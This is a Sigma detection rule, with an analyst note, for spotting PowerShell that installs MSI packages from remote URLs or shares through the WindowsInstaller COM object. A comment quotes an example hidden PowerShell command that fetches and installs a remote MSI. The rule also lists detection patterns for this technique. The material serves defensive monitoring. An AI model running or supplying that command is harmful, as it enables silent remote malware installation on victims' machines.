title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
id: 222720a7-047f-4054-baa5-bab9be757db0
status: experimental
description: |
  Detects the execution of PowerShell commands that attempt to install MSI packages via the
  Windows Installer COM object (`WindowsInstaller.Installer`) hosted remotely.
  This could be indication of malicious software deployment or lateral movement attempts using Windows Installer functionality.
  And the usage of WindowsInstaller COM object rather than msiexec could be an attempt to bypass the detection.
references:
- https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
- https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
- https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
author: Meroujan Antonyan (vx3r)
date: 2025-06-05
tags:
- attack.execution
- attack.t1059.001
- attack.defense-evasion
- attack.t1218
- attack.command-and-control
- attack.t1105
logsource:
  category: process_creation
  product: windows
detection:
    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u),'')";
  selection_img:
  - Image|endswith:
    - '\powershell_ise.exe'
    - '\powershell.exe'
    - '\pwsh.exe'
  - OriginalFileName:
    - 'PowerShell_ISE.EXE'
    - 'PowerShell.EXE'
    - 'pwsh.dll'
  selection_cli:
    CommandLine|contains|all:
    - '-ComObject'
    - 'InstallProduct('
  selection_remote:
    CommandLine|contains:
    - 'http'
    - '\\\\'
  filter_main_localhost:
    CommandLine|contains:
    - '://127.0.0.1'
    - '://localhost'
  condition: all of selection_* and not 1 of filter_main_*
falsepositives:
- Unknown
level: medium
note: |
  ---

  ### Technical Context

  This rule detects the execution of PowerShell commands attempting to install MSI packages using the Windows Installer COM object (`WindowsInstaller.Installer`) from a remote location. An attacker may use this method to deploy malware or perform lateral movement while attempting to evade detection mechanisms that focus on the standard `msiexec` command. This behavior is associated with the MITRE ATT&CK tactics of Execution (T1203) and Defense Evasion (T1218), as attackers may seek to blend their activities in normal operational processes.

  Primary telemetry sources for this detection include Windows process creation logs, specifically Event ID 4688, which captures process creation events, along with CommandLine details for identifying the specific arguments used. The security impact of a successful malicious installation could range from unauthorized egress of sensitive data to the comprehensive compromise of systems. Importantly, this detection does *not* confirm that an installation was completed or that the installer was indeed malicious without further context.

  ---

  ### Investigation Steps

  - **Validate the originating process:** Check for Windows Event ID 4688 logs for process creation events. Specifically, confirm that the command line includes `powershell.exe`, `powershell_ise.exe`, or `pwsh.exe` and matches the suspicious command structure outlined in the detection.

  - **Analyze command line parameters:** Review the CommandLine field for patterns indicating remote installation attempts, specifically checking for the use of `-ComObject` and `InstallProduct(`, combined with URLs starting with `http://` or UNC paths (e.g., `\\server\share`).

  - **Identify known good behavior:** Compare against legitimate PowerShell commands in your environment. Valid uses of PowerShell for MSI installation may utilize local resources or established software deployment processes, lacking remote or suspicious-looking command patterns.

  - **Correlate with additional indicators:** Look up related logs, specifically Sysmon Event ID 1, which reports process creation, for supporting evidence of lateral movement or other connected processes initiated by the PowerShell commands detected.

  - **Check for network communications:** Review firewall or proxy logs for outbound connections made by the detected PowerShell instance to the specified external addresses. Any established connections during the time of the suspicious command execution should be documented.

  - **Assess asset criticality:** If the source system of the alert is a critical server or workstation, prioritize deeper investigation into the security posture of that machine and determining any indicators of compromise (IoCs), including file creations or other activities around the time of the alert.

  ---

  ### Prioritization

  This alert is of medium severity, primarily because it indicates potential misuse of PowerShell that could lead to significant security breaches if the behavior is confirmed malicious. Given that attackers commonly leverage scripts and commands to deploy malware, the likelihood of exploitation is non-negligible, particularly in environments where robust monitoring is absent.

  ---

  ### Blind Spots and Assumptions

  Detection may be limited by obfuscation techniques used by attackers to disguise their intent. Remote installations may not always produce detectable logs if configurations are lacking, or if PowerShell command logging is inadequately enabled. Legitimate administrative functions, such as software deployment via centralized management tools, could also trigger this alert and must be analyzed carefully. Companion detections, such as monitoring for unusual outbound network connections during software installations, can strengthen visibility and verification of malicious activities.

